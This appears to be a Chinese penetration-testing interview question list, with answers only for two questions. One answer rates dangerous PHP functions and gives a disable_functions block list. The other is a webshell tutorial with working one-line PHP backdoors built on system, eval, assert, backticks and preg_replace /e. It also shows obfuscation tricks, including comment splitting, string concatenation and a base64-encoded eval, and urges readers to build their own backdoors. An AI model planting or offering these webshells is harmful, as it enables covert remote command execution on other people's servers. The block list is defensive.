@@ -1,0 +1,221 @@
+1 MYSQL权限划分
+2 系统用户权限划分
+3 linux命令及作用（至少十条）
+4 常见漏洞原理及利用
+5 一句话后门怎么写？
+6 在发现POST为XML数据格式时，可以测试什么漏洞？
+7 Windows和Linux都有,命令的功能一样（或相近）的命令有哪些？
+8 写任意一个WEB漏洞的分析（大致流程）
+9 XXE是什么？
+10 CSRF漏洞是什么？有什么用？
+11 CSRF与XSS有什么区别？
+12 MYSQL和MSSQL的各个权限有什么可利用的功能？
+13 oracle注入漏洞能用来做哪些事？
+14 python写一个POST请求URL
+15 用尽量多的编程语言写输出‘hello world’
+16 nginx、IIS、tomcat、weblogic分别有哪些漏洞可测试？知道其他WEB SERVER的也可以写出
+17 webshell的常见功能有哪些？
+18 FTP如何爆破？
+19 PHP的危险函数
+phpinfo()?
+功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。?
+危险等级：中?
+
+passthru()?
+功能描述：允许执行一个外部程序并回显输出，类似于 exec()。?
+危险等级：高?
+
+exec()?
+功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。?
+危险等级：高?
+
+system()?
+功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。?
+危险等级：高?
+
+chroot()?
+功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式?
+PHP 时才能工作，且该函数不适用于 Windows 系统。?
+危险等级：高?
+
+scandir()?
+功能描述：列出指定路径中的文件和目录。?
+危险等级：中?
+
+chgrp()?
+功能描述：改变文件或目录所属的用户组。?
+危险等级：高?
+
+chown()?
+功能描述：改变文件或目录的所有者。?
+危险等级：高?
+
+shell_exec()?
+功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。?
+危险等级：高?
+
+proc_open()?
+功能描述：执行一个命令并打开文件指针用于读取以及写入。?
+危险等级：高?
+
+proc_get_status()?
+功能描述：获取使用 proc_open() 所打开进程的信息。?
+危险等级：高?
+
+error_log()?
+功能描述：将错误信息发送到指定位置（文件）。?
+安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，?
+执行任意命令。?
+危险等级：低?
+
+ini_alter()?
+功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。?
+具体参见 ini_set()。?
+危险等级：高?
+
+ini_set()?
+功能描述：可用于修改、设置 PHP 环境配置参数。?
+危险等级：高?
+
+ini_restore()?
+功能描述：可用于恢复 PHP 环境配置参数到其初始值。?
+危险等级：高?
+
+dl()?
+功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。?
+危险等级：高?
+
+pfsockopen()?
+功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。?
+危险等级：高?
+
+syslog()?
+功能描述：可调用 UNIX 系统的系统层 syslog() 函数。?
+危险等级：中?
+
+readlink()?
+功能描述：返回符号连接指向的目标文件内容。?
+危险等级：中?
+
+symlink()?
+功能描述：在 UNIX 系统中建立一个符号链接。?
+危险等级：高?
+
+popen()?
+功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。?
+危险等级：高?
+
+stream_socket_server()?
+功能描述：建立一个 Internet 或 UNIX 服务器连接。?
+危险等级：中?
+
+putenv()?
+功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数?
+修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。?
+危险等级：高?
+
+禁用方法如下：?
+打开/etc/php.ini文件，?
+查找到 disable_functions ，添加需禁用的函数名，如下：?
+phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
+20 PHP中可以用来做后门的函数有哪些?
+0x1?原理
+1、执行系统命令的函数
+proc_open,?popen,?exec,?shell_exec,passthru,system
+这里只给出两个例子，其他的可以查看php手册编写
+?
+system()
+<?php
+system($_GET['input']);
+?>
+http://192.168.247.133:81/shell.php?input=dir
+?
+“``”执行命令
+``执行命令等价于shell_exec()函数来执行命令。
+<?php
+echo`$_GET[input]`;
+?>
+http://192.168.247.133:81/shell.php?input=dir
+再来个更短的
+<?=@`$_GET[c]`?>
+http://192.168.247.133:81/shell.php?c=dir
+注：这个要开启short_open_tag的，不过默认为on
+2、可以执行代码的函数
+eval()?函数把字符串按照PHP?代码来计算，该字符串必须是合法的PHP?代码，且必须以分号结尾。
+<?php
+eval($_GET['input']);
+?>
+正则表达式
+Preg_replace函数的作用是用来执行常规表达式的查找和替换的，Mixed?preg_replace(mixed?pattern,?mixed?replacement,?mixed?subject,int?limit,?int?&count)其中，Pattern是用来查找的常规表达式，replacement是用来替换的字符串，submit是要查找替换的字符串，limit是可以替换的字符串数，count是成功替换的数目。函数将返回替换后的字符串，当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作PHP代码执行。
+<?php
+preg_replace("//e",$_GET['input'],"qingsh4n");
+?>
+assert()
+assert这个函数在php语言中是用来判断一个表达式是否成立。但是其字符串参数会被执行。
+<?php
+assert($_GET['input']);
+?>
+ob_start()
+<?php
+$foobar =$_GET['input1'];
+ob_start($foobar);
+echo$_GET['input2'];
+ob_end_flush();
+?>
+http://192.168.247.133:81/shell.php?input1=system&input2=dir
+更多的函数需要同志们去挖掘。
+0x2?如何混淆
+1、注释/**/
+<?php
+assert/**/($/**/{"_GET"}['input']);
+?>
+2、连接号
+php中“.”为字符串连接符号
+<?php
+$var ="a";
+$var .="ss";
+$var .="er";
+$var .="t";
+$var($_GET['input']);
+?>
+注：测试时发现，echo()、eval()等函数无效。
+?
+3、创建函数
+create_function()?创建一个匿名函数
+<?php
+$foobar =$_GET['input'];
+$dyn_func =create_function('$qingsh4n', "echo $foobar;");
+$dyn_func('');
+?>
+5、编码函数，base64等
+<?php
+assert(base64_decode('ZXZhbCgkX0dFVFsnaW5wdXQnXSk7'));
+?>
+注：其他的编码函数有gzinflate()、gzuncompress()、gzdecode()、str_rot13()等，可以查看php手册编写。
+?
+6、可变函数
+PHP?支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP?将寻找与变量的值同名的函数，并且尝试执行它。
+<?php
+$dyn_func =$_GET['dyn_func'];
+$argument =$_GET['argument'];
+$dyn_func($argument);
+?>
+如果register_globals=on时，代码可以改为如下形式：
+<?php
+$input1($input2);
+?>
+http://192.168.247.133:81/shell.php?input1=system&input2=dir
+注：同样可以利用call_user_func()、array_walk()等函数
+0x3?编写自己的webshell
+通过上面的知识，可以任意组合上面写到的代码执行和混淆技术，编写属于自己的php后门应该是顺手拈来的事，如果谁有好的发现或者是奇淫技巧记得告诉我。最后附上酷壳上面关于hello?world的6种变态写法，也许在这里面会找到些许灵感。
+
+21 用实际代码写一次XSS的利用
+22 发现一处上传点，可以测试哪些方法？
+23 说一次拿到webshell+提权的过程（可以虚拟）
+24 java反序列化漏洞如何测试？
+25 redis漏洞有哪些?如何利用？
+26 windows系统中，webshell中建立用户不成功，为什么？
+27 CDN是什么？对渗透测试有什么影响？
+28 写几个常看的技术网站，其他知道但不常看的技术网站。
+29 写一些你自己觉得比较比别人好或研究的比较深入的技术。（加分题）
+30 写一次内网渗透过程（加分题）
